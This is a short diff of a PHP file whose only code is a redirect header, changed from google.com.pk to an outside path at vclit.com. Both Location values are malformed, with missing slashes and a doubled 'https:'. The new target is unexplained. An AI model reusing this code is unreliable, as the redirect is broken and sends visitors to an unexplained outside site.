@@ -1,5 +1,5 @@
 <?php
 
-header("Location:https:google.com.pk")
+header("Location:https:https://vclit.com/ssuh")
 
 ?>
